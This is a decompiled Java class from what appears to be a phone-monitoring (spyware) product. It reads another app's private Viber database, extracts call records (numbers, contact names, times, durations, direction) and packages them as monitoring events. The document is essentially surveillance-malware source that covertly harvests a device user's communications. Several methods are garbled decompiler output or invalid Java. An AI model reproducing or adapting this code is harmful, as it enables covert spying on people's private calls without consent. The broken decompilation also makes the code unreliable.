package com.vvt.capture.viber.a.a;

import android.database.Cursor;
import com.vvt.base.FxEvent;
import com.vvt.events.FxEventDirection;
import com.vvt.events.FxVoipCallLogEvent;
import com.vvt.events.FxVoipCallLogEvent.FxIsMonitor;
import com.vvt.events.FxVoipCategory;
import com.vvt.im.events.info.ICallLogData.Direction;
import com.vvt.im.events.info.ICallLogData.IsMonitor;
import java.util.ArrayList;

public class b
{
  private static final boolean a;
  private static final boolean b;
  private static final boolean c;
  
  static
  {
    boolean bool = com.vvt.ak.a.a;
    if (bool) {}
    for (bool = true;; bool = false)
    {
      a = bool;
      b = com.vvt.ak.a.b;
      c = com.vvt.ak.a.e;
      return;
    }
  }
  
  /* Error */
  public static long a(int paramInt)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_1
    //   2: ldc 24
    //   4: astore_2
    //   5: ldc 26
    //   7: astore_3
    //   8: aload_2
    //   9: aload_3
    //   10: invokestatic 31	com/vvt/af/a/a:a	(Ljava/lang/String;Ljava/lang/String;)Lcom/vvt/af/a/a;
    //   13: astore_3
    //   14: aload_3
    //   15: iload_0
    //   16: invokestatic 34	com/vvt/capture/viber/a/a/removeFromPath:a	(Lcom/vvt/af/a/a;I)J
    //   19: lstore 4
    //   21: getstatic 14	com/vvt/capture/viber/a/a/removeFromPath:a	Z
    //   24: istore 6
    //   26: iload 6
    //   28: ifeq +3 -> 31
    //   31: aload_3
    //   32: ifnull +7 -> 39
    //   35: aload_3
    //   36: invokevirtual 37	com/vvt/af/a/a:a	()V
    //   39: lload 4
    //   41: lreturn
    //   42: astore_2
    //   43: aconst_null
    //   44: astore_3
    //   45: iconst_m1
    //   46: i2l
    //   47: lstore 4
    //   49: getstatic 22	com/vvt/capture/viber/a/a/removeFromPath:MyUncaughtExceptionHandler	Z
    //   52: istore 6
    //   54: iload 6
    //   56: ifeq +3 -> 59
    //   59: aload_3
    //   60: ifnull -21 -> 39
    //   63: goto -28 -> 35
    //   66: astore_2
    //   67: aconst_null
    //   68: astore_3
    //   69: aload_2
    //   70: astore_1
    //   71: aload_3
    //   72: ifnull +7 -> 79
    //   75: aload_3
    //   76: invokevirtual 37	com/vvt/af/a/a:a	()V
    //   79: aload_1
    //   80: athrow
    //   81: astore_1
    //   82: goto -11 -> 71
    //   85: astore_1
    //   86: goto -41 -> 45
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	89	0	paramInt	int
    //   1	79	1	localObject1	Object
    //   81	1	1	localObject2	Object
    //   85	1	1	localException1	Exception
    //   4	5	2	str	String
    //   42	1	2	localException2	Exception
    //   66	4	2	localObject3	Object
    //   7	69	3	localObject4	Object
    //   19	29	4	l	long
    //   24	31	6	bool	boolean
    // Exception table:
    //   from	to	target	type
    //   9	13	42	java/lang/Exception
    //   9	13	66	finally
    //   15	19	81	finally
    //   21	24	81	finally
    //   49	52	81	finally
    //   15	19	85	java/lang/Exception
    //   21	24	85	java/lang/Exception
  }
  
  private static long a(com.vvt.af.a.a parama)
  {
    return a(parama, 1);
  }
  
  /* Error */
  private static long a(com.vvt.af.a.a parama, int paramInt)
  {
    // Byte code:
    //   0: iconst_m1
    //   1: i2l
    //   2: lstore_2
    //   3: aconst_null
    //   4: astore 4
    //   6: iconst_m1
    //   7: istore 5
    //   9: iload_1
    //   10: iload 5
    //   12: if_icmpeq +225 -> 237
    //   15: ldc 41
    //   17: astore 6
    //   19: ldc 43
    //   21: astore 7
    //   23: aconst_null
    //   24: astore 8
    //   26: iconst_0
    //   27: istore 9
    //   29: iload_1
    //   30: invokestatic 49	java/lang/Integer:toString	(I)Ljava/lang/String;
    //   33: astore 10
    //   35: aload_0
    //   36: astore 11
    //   38: aload_0
    //   39: aload 7
    //   41: aconst_null
    //   42: aconst_null
    //   43: aconst_null
    //   44: aconst_null
    //   45: aconst_null
    //   46: aload 6
    //   48: aload 10
    //   50: invokevirtual 52	com/vvt/af/a/a:a	(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   53: astore 11
    //   55: aload 11
    //   57: ifnull +170 -> 227
    //   60: aload 11
    //   62: invokeinterface 58 1 0
    //   67: istore 12
    //   69: iload 12
    //   71: ifeq +62 -> 133
    //   74: ldc 60
    //   76: astore 7
    //   78: aload 11
    //   80: aload 7
    //   82: invokeinterface 64 2 0
    //   87: istore 12
    //   89: aload 11
    //   91: iload 12
    //   93: invokeinterface 68 2 0
    //   98: lstore 13
    //   100: lload 13
    //   102: lstore 15
    //   104: aload 11
    //   106: astore 8
    //   108: getstatic 14	com/vvt/capture/viber/a/a/removeFromPath:a	Z
    //   111: istore 9
    //   113: iload 9
    //   115: ifeq +3 -> 118
    //   118: aload 8
    //   120: ifnull +10 -> 130
    //   123: aload 8
    //   125: invokeinterface 71 1 0
    //   130: lload 15
    //   132: lreturn
    //   133: lconst_0
    //   134: lstore 13
    //   136: lload 13
    //   138: lstore 15
    //   140: aload 11
    //   142: astore 8
    //   144: goto -36 -> 108
    //   147: astore 11
    //   149: aconst_null
    //   150: astore 8
    //   152: iconst_m1
    //   153: i2l
    //   154: lstore 15
    //   156: getstatic 22	com/vvt/capture/viber/a/a/removeFromPath:MyUncaughtExceptionHandler	Z
    //   159: istore 9
    //   161: iload 9
    //   163: ifeq +3 -> 166
    //   166: aload 8
    //   168: ifnull -38 -> 130
    //   171: goto -48 -> 123
    //   174: astore 11
    //   176: aload 4
    //   178: ifnull +10 -> 188
    //   181: aload 4
    //   183: invokeinterface 71 1 0
    //   188: aload 11
    //   190: athrow
    //   191: astore 7
    //   193: aload 11
    //   195: astore 4
    //   197: aload 7
    //   199: astore 11
    //   201: goto -25 -> 176
    //   204: astore 11
    //   206: aload 8
    //   208: astore 4
    //   210: goto -34 -> 176
    //   213: astore 7
    //   215: aload 11
    //   217: astore 8
    //   219: goto -67 -> 152
    //   222: astore 11
    //   224: goto -72 -> 152
    //   227: aload 11
    //   229: astore 8
    //   231: lload_2
    //   232: lstore 15
    //   234: goto -126 -> 108
    //   237: aconst_null
    //   238: astore 8
    //   240: lload_2
    //   241: lstore 15
    //   243: goto -135 -> 108
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	246	0	parama	com.vvt.af.a.a
    //   0	246	1	paramInt	int
    //   2	239	2	l1	long
    //   4	205	4	localObject1	Object
    //   7	6	5	i	int
    //   17	30	6	str1	String
    //   21	60	7	str2	String
    //   191	7	7	localObject2	Object
    //   213	1	7	localException1	Exception
    //   24	215	8	localObject3	Object
    //   27	135	9	bool1	boolean
    //   33	16	10	str3	String
    //   36	105	11	localObject4	Object
    //   147	1	11	localException2	Exception
    //   174	20	11	localObject5	Object
    //   199	1	11	localObject6	Object
    //   204	12	11	localObject7	Object
    //   222	6	11	localException3	Exception
    //   67	3	12	bool2	boolean
    //   87	5	12	j	int
    //   98	39	13	l2	long
    //   102	140	15	l3	long
    // Exception table:
    //   from	to	target	type
    //   29	33	147	java/lang/Exception
    //   48	53	147	java/lang/Exception
    //   29	33	174	finally
    //   48	53	174	finally
    //   60	67	191	finally
    //   80	87	191	finally
    //   91	98	191	finally
    //   108	111	204	finally
    //   156	159	204	finally
    //   60	67	213	java/lang/Exception
    //   80	87	213	java/lang/Exception
    //   91	98	213	java/lang/Exception
    //   108	111	222	java/lang/Exception
  }
  
  public static long a(String paramString)
  {
    locala = null;
    long l = -1;
    try
    {
      locala = com.vvt.af.a.a.a(paramString);
      l = a(locala);
      bool = a;
      if (bool) {}
      if (locala == null) {
        break label33;
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        label33:
        if (locala != null) {
          locala.a();
        }
        boolean bool = c;
        if ((bool) && (locala == null)) {}
      }
    }
    finally
    {
      if (locala == null) {
        break label71;
      }
      locala.a();
    }
    locala.a();
    return l;
  }
  
  static FxEvent a(com.vvt.capture.viber.a parama)
  {
    FxVoipCallLogEvent localFxVoipCallLogEvent = new com/vvt/events/FxVoipCallLogEvent;
    localFxVoipCallLogEvent.<init>();
    long l = parama.h();
    localFxVoipCallLogEvent.setEventTime(l);
    Object localObject1 = FxVoipCategory.VIBER;
    localFxVoipCallLogEvent.setVoipCategory((FxVoipCategory)localObject1);
    localObject1 = FxEventDirection.MISSED_CALL;
    Object localObject2 = parama.i();
    ICallLogData.Direction localDirection = ICallLogData.Direction.IN;
    if (localObject2 == localDirection)
    {
      localObject1 = FxEventDirection.IN;
      localFxVoipCallLogEvent.setDirection((FxEventDirection)localObject1);
      l = parama.a();
      localFxVoipCallLogEvent.setDuration(l);
      localObject1 = parama.b();
      localFxVoipCallLogEvent.setUserId((String)localObject1);
      localObject1 = parama.c();
      localFxVoipCallLogEvent.setContactName((String)localObject1);
      int i = parama.d();
      l = i;
      localFxVoipCallLogEvent.setTransferredBytes(l);
      localObject1 = parama.e();
      localObject2 = ICallLogData.IsMonitor.YES;
      if (localObject1 != localObject2) {
        break label180;
      }
    }
    label180:
    for (localObject1 = FxVoipCallLogEvent.FxIsMonitor.YES;; localObject1 = FxVoipCallLogEvent.FxIsMonitor.NO)
    {
      localFxVoipCallLogEvent.setIsMonitor((FxVoipCallLogEvent.FxIsMonitor)localObject1);
      l = parama.f();
      localFxVoipCallLogEvent.setFrameStripId(l);
      return localFxVoipCallLogEvent;
      localObject2 = parama.i();
      localDirection = ICallLogData.Direction.OUT;
      if (localObject2 != localDirection) {
        break;
      }
      localObject1 = FxEventDirection.OUT;
      break;
    }
  }
  
  public static String a()
  {
    StringBuilder localStringBuilder = new java/lang/StringBuilder;
    localStringBuilder.<init>();
    localStringBuilder.append("SELECT ");
    localStringBuilder.append("messages_calls._id, ");
    localStringBuilder.append("messages_calls.conversation_id, ");
    localStringBuilder.append("messages_calls.canonized_number, ");
    localStringBuilder.append("messages_calls.date, ");
    localStringBuilder.append("messages_calls.duration, ");
    localStringBuilder.append("messages_calls.type ");
    localStringBuilder.append("FROM messages_calls ");
    localStringBuilder.append("ORDER BY _id DESC ");
    localStringBuilder.append("LIMIT 1");
    return localStringBuilder.toString();
  }
  
  /* Error */
  private static String a(com.vvt.af.a.a parama, String paramString)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_2
    //   2: getstatic 14	com/vvt/capture/viber/a/a/removeFromPath:a	Z
    //   5: istore_3
    //   6: iload_3
    //   7: ifeq +3 -> 10
    //   10: aload_0
    //   11: ifnull +157 -> 168
    //   14: invokestatic 213	com/vvt/capture/viber/mode/full/removeFromPath:a	()Ljava/lang/String;
    //   17: astore 4
    //   19: iconst_1
    //   20: istore 5
    //   22: iload 5
    //   24: anewarray 215	java/lang/String
    //   27: astore 6
    //   29: aload 6
    //   31: iconst_0
    //   32: aload_1
    //   33: aastore
    //   34: aload_0
    //   35: aload 4
    //   37: aload 6
    //   39: invokevirtual 218	com/vvt/af/a/a:a	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   42: astore 4
    //   44: aload 4
    //   46: ifnull +42 -> 88
    //   49: aload 4
    //   51: invokeinterface 221 1 0
    //   56: istore 5
    //   58: iload 5
    //   60: ifeq +28 -> 88
    //   63: ldc -33
    //   65: astore 6
    //   67: aload 4
    //   69: aload 6
    //   71: invokeinterface 64 2 0
    //   76: istore 5
    //   78: aload 4
    //   80: iload 5
    //   82: invokeinterface 226 2 0
    //   87: astore_2
    //   88: aload 4
    //   90: ifnull +10 -> 100
    //   93: aload 4
    //   95: invokeinterface 71 1 0
    //   100: getstatic 14	com/vvt/capture/viber/a/a/removeFromPath:a	Z
    //   103: istore_3
    //   104: iload_3
    //   105: ifeq +3 -> 108
    //   108: aload_2
    //   109: areturn
    //   110: astore 4
    //   112: iconst_0
    //   113: istore_3
    //   114: aconst_null
    //   115: astore 4
    //   117: getstatic 14	com/vvt/capture/viber/a/a/removeFromPath:a	Z
    //   120: istore 5
    //   122: iload 5
    //   124: ifeq +3 -> 127
    //   127: aload 4
    //   129: ifnull -29 -> 100
    //   132: goto -39 -> 93
    //   135: astore 7
    //   137: iconst_0
    //   138: istore_3
    //   139: aconst_null
    //   140: astore 4
    //   142: aload 7
    //   144: astore_2
    //   145: aload 4
    //   147: ifnull +10 -> 157
    //   150: aload 4
    //   152: invokeinterface 71 1 0
    //   157: aload_2
    //   158: athrow
    //   159: astore_2
    //   160: goto -15 -> 145
    //   163: astore 6
    //   165: goto -48 -> 117
    //   168: iconst_0
    //   169: istore_3
    //   170: aconst_null
    //   171: astore 4
    //   173: goto -85 -> 88
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	176	0	parama	com.vvt.af.a.a
    //   0	176	1	paramString	String
    //   1	157	2	localObject1	Object
    //   159	1	2	localObject2	Object
    //   5	165	3	bool1	boolean
    //   17	77	4	localObject3	Object
    //   110	1	4	localException1	Exception
    //   115	57	4	localObject4	Object
    //   20	39	5	bool2	boolean
    //   76	5	5	i	int
    //   120	3	5	bool3	boolean
    //   27	43	6	localObject5	Object
    //   163	1	6	localException2	Exception
    //   135	8	7	localObject6	Object
    // Exception table:
    //   from	to	target	type
    //   14	17	110	java/lang/Exception
    //   22	27	110	java/lang/Exception
    //   32	34	110	java/lang/Exception
    //   37	42	110	java/lang/Exception
    //   14	17	135	finally
    //   22	27	135	finally
    //   32	34	135	finally
    //   37	42	135	finally
    //   49	56	159	finally
    //   69	76	159	finally
    //   80	87	159	finally
    //   117	120	159	finally
    //   49	56	163	java/lang/Exception
    //   69	76	163	java/lang/Exception
    //   80	87	163	java/lang/Exception
  }
  
  public static ArrayList a(long paramLong1, long paramLong2)
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    boolean bool2 = false;
    locala = null;
    String str1 = "com.viber.voip";
    String str2 = "viber_messages";
    try
    {
      locala = com.vvt.af.a.a.a(str1, str2);
      if (locala != null) {
        localArrayList = a(locala, paramLong1, paramLong2);
      }
      if (locala == null) {
        break label67;
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool3 = c;
        if ((bool3) && (locala == null)) {}
      }
    }
    finally
    {
      if (locala == null) {
        break label122;
      }
      locala.a();
    }
    locala.a();
    label67:
    bool2 = b;
    if (bool2) {}
    bool2 = a;
    if (bool2) {}
    return localArrayList;
  }
  
  public static ArrayList a(Cursor paramCursor, com.vvt.af.a.a parama)
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    for (;;)
    {
      try
      {
        boolean bool1 = paramCursor.moveToNext();
        if (bool1)
        {
          Object localObject2 = "conversation_id";
          int i = paramCursor.getColumnIndex((String)localObject2);
          localObject2 = paramCursor.getString(i);
          Object localObject3 = "date";
          int j = paramCursor.getColumnIndex((String)localObject3);
          long l1 = paramCursor.getLong(j);
          String str1 = "type";
          int k = paramCursor.getColumnIndex(str1);
          k = paramCursor.getInt(k);
          String str2 = "duration";
          int m = paramCursor.getColumnIndex(str2);
          long l2 = paramCursor.getLong(m);
          String str3 = "canonized_number";
          int n = paramCursor.getColumnIndex(str3);
          str3 = paramCursor.getString(n);
          localObject2 = a(parama, (String)localObject2);
          com.vvt.capture.viber.a locala = new com/vvt/capture/viber/a;
          locala.<init>();
          locala.b(l1);
          localObject3 = b(k);
          locala.a((ICallLogData.Direction)localObject3);
          locala.a(l2);
          locala.a(str3);
          locala.b((String)localObject2);
          i = 0;
          localObject2 = null;
          locala.a(0);
          localObject2 = ICallLogData.IsMonitor.NO;
          locala.a((ICallLogData.IsMonitor)localObject2);
          i = 0;
          localObject2 = null;
          locala.b(0);
          localArrayList.add(locala);
        }
        else
        {
          boolean bool2;
          if (paramCursor == null) {}
        }
      }
      catch (Exception localException)
      {
        bool2 = c;
        if (bool2) {}
        return localArrayList;
      }
      finally
      {
        if (paramCursor != null) {
          paramCursor.close();
        }
      }
    }
  }
  
  private static ArrayList a(com.vvt.af.a.a parama, long paramLong1, long paramLong2)
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    localCursor = null;
    try
    {
      String str1 = c();
      int i = 3;
      String[] arrayOfString = new String[i];
      int j = 0;
      String str2 = Long.toString(paramLong1);
      arrayOfString[0] = str2;
      j = 1;
      str2 = Long.toString(paramLong2);
      arrayOfString[j] = str2;
      j = 2;
      int k = -1 >>> 1;
      str2 = Integer.toString(k);
      arrayOfString[j] = str2;
      localCursor = parama.a(str1, arrayOfString);
      if (localCursor != null) {
        localArrayList = a(localCursor, parama);
      }
      if (localCursor == null) {
        break label116;
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool = c;
        if ((bool) && (localCursor == null)) {}
      }
    }
    finally
    {
      if (localCursor == null) {
        break label153;
      }
      localCursor.close();
    }
    localCursor.close();
    label116:
    return localArrayList;
  }
  
  public static ArrayList a(String paramString, long paramLong1, long paramLong2)
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    boolean bool2 = false;
    com.vvt.af.a.a locala = null;
    try
    {
      locala = com.vvt.af.a.a.a(paramString);
      if (locala != null) {
        localArrayList = a(locala, paramLong1, paramLong2);
      }
      if (locala != null) {
        locala.a();
      }
      bool2 = b;
      if (bool2) {}
      bool2 = a;
      if (bool2) {}
      return localArrayList;
    }
    finally
    {
      if (locala != null) {
        locala.a();
      }
    }
  }
  
  /* Error */
  public static long b()
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_0
    //   2: ldc 24
    //   4: astore_1
    //   5: ldc 26
    //   7: astore_2
    //   8: aload_1
    //   9: aload_2
    //   10: invokestatic 31	com/vvt/af/a/a:a	(Ljava/lang/String;Ljava/lang/String;)Lcom/vvt/af/a/a;
    //   13: astore_2
    //   14: aload_2
    //   15: invokestatic 77	com/vvt/capture/viber/a/a/removeFromPath:a	(Lcom/vvt/af/a/a;)J
    //   18: lstore_3
    //   19: getstatic 14	com/vvt/capture/viber/a/a/removeFromPath:a	Z
    //   22: istore 5
    //   24: iload 5
    //   26: ifeq +3 -> 29
    //   29: aload_2
    //   30: ifnull +7 -> 37
    //   33: aload_2
    //   34: invokevirtual 37	com/vvt/af/a/a:a	()V
    //   37: lload_3
    //   38: lreturn
    //   39: astore_1
    //   40: aconst_null
    //   41: astore_2
    //   42: iconst_m1
    //   43: i2l
    //   44: lstore_3
    //   45: getstatic 22	com/vvt/capture/viber/a/a/removeFromPath:MyUncaughtExceptionHandler	Z
    //   48: istore 5
    //   50: iload 5
    //   52: ifeq +3 -> 55
    //   55: aload_2
    //   56: ifnull -19 -> 37
    //   59: goto -26 -> 33
    //   62: astore_1
    //   63: aconst_null
    //   64: astore_2
    //   65: aload_1
    //   66: astore_0
    //   67: aload_2
    //   68: ifnull +7 -> 75
    //   71: aload_2
    //   72: invokevirtual 37	com/vvt/af/a/a:a	()V
    //   75: aload_0
    //   76: athrow
    //   77: astore_0
    //   78: goto -11 -> 67
    //   81: astore_0
    //   82: goto -40 -> 42
    // Local variable table:
    //   start	length	slot	name	signature
    //   1	75	0	localObject1	Object
    //   77	1	0	localObject2	Object
    //   81	1	0	localException1	Exception
    //   4	5	1	str	String
    //   39	1	1	localException2	Exception
    //   62	4	1	localObject3	Object
    //   7	65	2	localObject4	Object
    //   18	27	3	l	long
    //   22	29	5	bool	boolean
    // Exception table:
    //   from	to	target	type
    //   9	13	39	java/lang/Exception
    //   9	13	62	finally
    //   14	18	77	finally
    //   19	22	77	finally
    //   45	48	77	finally
    //   14	18	81	java/lang/Exception
    //   19	22	81	java/lang/Exception
  }
  
  private static ICallLogData.Direction b(int paramInt)
  {
    ICallLogData.Direction localDirection = ICallLogData.Direction.MISSED_CALL;
    switch (paramInt)
    {
    }
    for (;;)
    {
      return localDirection;
      localDirection = ICallLogData.Direction.IN;
      continue;
      localDirection = ICallLogData.Direction.OUT;
    }
  }
  
  private static String c()
  {
    StringBuilder localStringBuilder = new java/lang/StringBuilder;
    localStringBuilder.<init>();
    localStringBuilder.append("SELECT ");
    localStringBuilder.append("messages_calls._id, ");
    localStringBuilder.append("messages_calls.conversation_id, ");
    localStringBuilder.append("messages_calls.canonized_number, ");
    localStringBuilder.append("messages_calls.date, ");
    localStringBuilder.append("messages_calls.duration, ");
    localStringBuilder.append("messages_calls.type ");
    localStringBuilder.append("FROM messages_calls ");
    localStringBuilder.append("where messages_calls._id > ? AND messages_calls._id <= ?");
    localStringBuilder.append("ORDER BY _id DESC ");
    localStringBuilder.append("LIMIT ?");
    return localStringBuilder.toString();
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/viber/a/a/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */